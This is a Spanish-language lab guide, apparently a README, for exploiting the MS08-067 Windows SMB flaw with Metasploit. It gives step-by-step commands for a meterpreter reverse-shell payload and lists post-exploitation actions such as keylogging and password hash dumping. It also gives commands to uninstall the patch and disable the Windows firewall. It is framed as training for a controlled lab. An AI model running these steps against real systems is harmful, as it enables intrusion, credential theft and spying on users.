# 🛡️ **Guía para Explotar MS08-067 con Metasploit**

________________________________________
## ⚠️ **Aviso Legal / Disclaimer**
Este ejercicio se realiza únicamente con fines educativos y de aprendizaje en un entorno controlado y autorizado.
No debe utilizarse en redes, sistemas o equipos fuera del laboratorio sin el consentimiento explícito del propietario.
El uso indebido de estas técnicas en contextos reales puede ser ilegal y tener consecuencias legales graves.
Como estudiantes y profesionales de la ciberseguridad, debemos actuar siempre de forma ética y responsable.
________________________________________

Esta guía explica paso a paso cómo explotar la vulnerabilidad MS08-067 (netapi) usando Metasploit Framework. Solo debe usarse con fines educativos o en entornos de laboratorio controlado. Explotar sistemas sin permiso es ilegal.
________________________________________
## 🛡️ **¿Qué es MS08-067 (NETAPI)?**
- Vulnerabilidad crítica en el servicio Server (netapi32.dll) de Windows.
- Permite ejecución remota de código sin autenticación.
- Afecta Windows XP SP2/SP3 y Server 2003 sin parches.
- Fue utilizada por el gusano Conficker.
________________________________________
## 🧰 **Requisitos del entorno de laboratorio**
-	💻 [Kali Linux (máquina atacante).](https://www.kali.org/get-kali/#kali-platforms)
-	🧱 [Máquina víctima: Windows XP SP2/SP3 sin parches.](https://archive.org/details/windows-xp-sp-2-september-2008)
- 🧱 [Máquina víctima: Linuix (opcional).](https://sourceforge.net/projects/metasploitable/)
- Ambas en la misma red (real o virtual).
________________________________________
## 🧪 **Paso a paso: Explotación con Metasploit**
________________________________________
**🔹 1. Obtener la IP de la víctima** (en la máquina Windows)
<pre>ipconfig.</pre>
________________________________________
**🔹 2. Iniciar Metasploit** (en Kali)
<pre>msfconsole</pre>
________________________________________
**🔹 3. Buscar el exploit**
<pre>search ms08_067</pre>
________________________________________
**🔹 4. Cargar el exploit**
<pre>use exploit/windows/smb/ms08_067_netapi</pre>
________________________________________
**🔹 5. Ver opciones**
<pre>show options</pre>

Debes configurar:
-	**RHOST:** IP de la víctima
-	**LHOST:** IP del atacante
-	**PAYLOAD:** tipo de shell que quieres usar
________________________________________
**🔹 6. Configurar opciones**
<pre>set RHOST [IP víctima]</pre>
<pre>set LHOST [IP atacante]</pre>
<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
________________________________________
**🔹 7. Verificar configuración**
<pre>show options</pre>
________________________________________
**🔹 8. Ejecutar exploit**
<pre>exploit</pre>
________________________________________
## ✅ **Resultado esperado**
<pre> Meterpreter session 1 opened </pre> 
Se abre una shell Meterpreter si tuvo éxito.
________________________________________
## 🧠 **¿Qué hacer con Meterpreter?**
- **sysinfo:** Info del sistema.
- **getuid:** Usuario actual.
- **shell:** Abre terminal.
- **download archivo:** Descargar archivo.
- **screenshot:** Captura de pantalla.
- **keyscan_start:** Inicia keylogger.
- **hashdump:** Extrae hashes de contraseñas.
________________________________________
## ❌ **Consejos adicionales**
- **Para verificar si el Windows XP es vulnerable:** ```bash nmap -p 445 --script smb-vuln-ms08-067 <IP_víctima> ```
- **Verificar si el parche MS08-067 esta instalado:** ```bash systeminfo | find "KB958644" ```
- **En caso de estar instalado usar el siguiente comando para desinstalarlo:** ```bash wusa /uninstall /kb:958644 ```
- **Desactivar firewall de Windows:** ```bash netsh firewall set opmode disable ```
________________________________________
## 📚 **Recursos**
- [Exploit-DB: MS08-067](https://www.exploit-db.com/exploits/7104)
- [Rapid7 Metasploit Docs](https://www.rapid7.com/blog/post/2014/02/03/new-ms08-067/)
